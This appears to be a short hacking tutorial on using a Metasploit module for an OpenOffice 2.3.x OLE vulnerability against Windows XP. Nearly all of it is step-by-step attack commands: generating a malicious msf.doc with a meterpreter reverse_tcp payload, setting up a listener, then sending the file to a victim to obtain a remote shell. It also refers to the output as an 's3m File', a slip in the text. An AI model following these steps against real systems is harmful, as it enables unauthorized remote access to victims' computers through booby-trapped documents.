Hack Remote PC using Open Office Exploit

This module exploits vulnerability in OpenOffice 2.3.1 and 2.3.0 on Microsoft Windows XP SP3. By supplying an OLE file with a malformed Document Summary Information stream, an attacker can gain control of the execution flow, which results arbitrary code execution under the context of the user.
Windows XP SP 3
OpenOffice 2.3.1
Attacker: Backtrack 5
Victim PC: Windows XP
Open Kali Linux terminal type msfconsole

Now type use exploit/windows/fileformat/openoffice_ole
msf exploit (openoffice_ole)>set payload windows/meterpreter/reverse_tcp 
msf exploit (openoffice_ole)>set lhost 192.168.0.106 (IP of Local Host)
msf exploit (openoffice_ole)>exploit

After we successfully generate the malicious s3m File, it will stored on your local computer
/root/.msf4/local/msf.doc

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.106
exploit
Now send your msf.doc files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
